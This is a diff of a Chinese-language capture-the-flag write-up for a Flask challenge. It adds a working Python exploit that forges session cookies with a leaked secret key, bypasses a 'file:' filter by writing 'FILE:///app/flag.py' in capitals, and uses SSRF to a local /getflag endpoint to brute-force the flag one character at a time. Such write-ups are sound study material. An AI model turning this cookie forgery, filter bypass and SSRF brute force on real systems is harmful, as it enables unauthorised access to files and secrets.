@@ -639,32 +639,30 @@ if __name__ == '__main__':
 
 flag就在 flag.py文件里。
 
-/get_hindd_result 过滤了file:协议，不能直接读取本地内容。。。未完。。。
+/get_hindd_result 过滤了file:协议，不能直接读取本地内容。。。大小写绕过
 
+爆破脚本上。搞出flag.py
 
+```py
+def waf(req):
+    if not req.base_url.startswith("http://127.0.0.1"):
+        return "NoNo!!"
+    if not req.full_path.endswith(".html?"):
+        return "No!"
+    return os.getenv("FLAG")
+```
 
-
-
+还是ssrf访问。继续爆flag。以.html?结束路径
 
 ### 完整脚本
 ```python
+from urllib.request import Request
+
 from requests_html import HTMLSession
-import flask_unsign
 
-base_url = 'http://1.14.71.254:28076'
-# base_url = 'http://localhost:8888'
+base_url = 'http://1.14.71.254:28093'
+# base_url = 'http://localhost:5000'
 s = HTMLSession()
-
-def sign(key, data):
-    from flask import Flask
-    from flask.sessions import SecureCookieSessionInterface
-
-    app = Flask(__name__)
-    app.secret_key = key.encode()
-
-    session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)
-    dumps = session_serializer.dumps(data)
-    return  dumps
 
 
 def step1():
@@ -686,56 +684,68 @@ def step1():
     key = d.get('key')
     print(key)
     open('key.txt', 'w').write(key)
-    # http://1.14.71.254:28052/getkey
+
+
+import flask_unsign
+
+chars = '\n'
+for i in range(32, 128):
+    chars += chr(i)
+from string import ascii_lowercase as al
+
+chars = ' ' + al + chars.replace(al, '').replace(' ', '')
 
 
 def step2():
+    flag = 'def waf(req)'
+    while True:
+        for c in chars:  # 10-lf,13-cr
+            txt = flag + c
+            data = {'admin': False, 'data': txt.encode(), 'url': 'FILE:///app/flag.py'}  # work
+            secret = open('key.txt', 'r').read()
+            s.cookies.clear()
+            session = flask_unsign.sign(data, secret)
+            cookies = {"session": session}
 
-    flag = open('bf.txt', 'r').read()
+            url = '%s/get_hindd_result' % base_url
+            res = s.get(url, cookies=cookies)
 
-    try:
-        while True:
-            flag = find_one(flag)
-    except Exception as e:
-        open('bf.txt', 'w').write(flag)
-        print('error')
-    # http://1.14.71.254:28052/getkey
+            if 'you get it' in res.text:
+                flag += c
+                print(f'char:{c}, flag = {flag}')
+                break
+            else:
+                print(f'{c}: {res.text}')
+            if ord(c) == 127:
+                raise Exception
 
 
-def find_one(flag):
-    for i in range(32, 127):
-        ch = chr(i)
-        # data = {'admin': False, 'data': b'app', 'url': 'http://127.0.0.1:8888/index'}
-        # data = {'admin': False, 'data': b'app', 'url': 'http://127.0.0.1:8888/'}
-        # data_plain = flag + ch
-        data_plain = ch + flag
-        # data = {'admin': False, 'data': data_plain.encode(), 'url': 'http://127.0.0.1:8888/index'}
-        # data = {'admin': False, 'data': data_plain.encode(), 'url': 'http://127.0.0.1:8888/index'}
-        data = {'admin': True, 'data': data_plain.encode(), 'url': 'http://127.0.0.1:8888/getflag'}
-        # data = {'admin': True, 'data': '!', 'url': 'http://127.0.0.1:8888/getflag'}
-        secret = open('key.txt', 'r').read()
-        session = flask_unsign.sign(data, secret)
-        # session = sign(secret, data)
+def step3():
+    flag = 'NSSCTF{'
+    while True:
+        for c in chars:  # 10-lf,13-cr
+            txt = flag + c
+            data = {'admin': False, 'data': txt.encode(), 'url': 'http://127.0.0.1:8888/getflag?1.html?'}  # work
+            secret = open('key.txt', 'r').read()
+            s.cookies.clear()
+            session = flask_unsign.sign(data, secret)
+            cookies = {"session": session}
 
-        cookies = {"session": session}
+            url = '%s/get_hindd_result' % base_url
+            res = s.get(url, cookies=cookies)
 
-        url = '%s/get_hindd_result' % base_url
-        # url = '%s/getflag' % base_url
-
-        proxies = {'http': 'http://127.0.0.1:8080'}
-        proxies= {}
-        s.cookies.clear()
-        res = s.get(url, cookies=cookies, proxies=proxies)
-        if res.text == 'you get it':
-            flag = data_plain
-            print(res.text, 'i = ', ch, 'flag = ', flag)
-            return flag
-        else:
-            print(res.text, 'data = ', data_plain)
-    raise Exception("not found")
+            if 'you get it' in res.text:
+                flag += c
+                print(f'char:{c}, flag = {flag}')
+                break
+            else:
+                print(f'{c}: {res.text}')
+            if ord(c) == 127:
+                raise Exception
 
 
 if __name__ == '__main__':
-    step1()
-    step2()
+    # step1()
+    # step2()
+    step3()
 ```
